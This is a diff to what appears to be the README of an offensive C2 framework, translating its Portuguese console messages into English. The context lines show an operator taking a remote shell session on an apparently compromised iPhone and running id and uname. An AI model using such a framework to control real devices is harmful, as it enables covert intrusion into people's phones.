@@ -172,14 +172,14 @@ For complete schema details, see [API & Console Reference](docs/API_AND_CONSOLE.
 Once the target finishes Stage 3, a session is established on the C2 listener:
 
 ```text
-[*] Nova sessão 4f8b1a92 — 192.168.1.50:54210
+[*] New session 4f8b1a92 — 192.168.1.50:54210
 
 (coruna)> list
   [4f8b1a92] 192.168.1.50 2026-10-31 21:40:00
 
 (coruna)> use 4f8b1a92
 
-[*] Conectado a 192.168.1.50 (sessão 4f8b1a92). Digite 'exit' ou 'back' para voltar.
+[*] Connected to 192.168.1.50 (session 4f8b1a92). Type 'exit' or 'back' to return.
 
 (shell)> id
 uid=501(mobile) gid=501(mobile) groups=501(mobile)
@@ -188,7 +188,7 @@ uid=501(mobile) gid=501(mobile) groups=501(mobile)
 Darwin iPhone 21.3.0 Darwin Kernel Version 21.3.0: Wed Jan  5 21:37:58 PST 2022; root:xnu-8019.80.4~1/RELEASE_ARM64_T8015 iPhone10,6
 
 (shell)> exit
-[*] Voltando ao menu principal.
+[*] Returning to main menu.
 
 (coruna)> quit
 ```
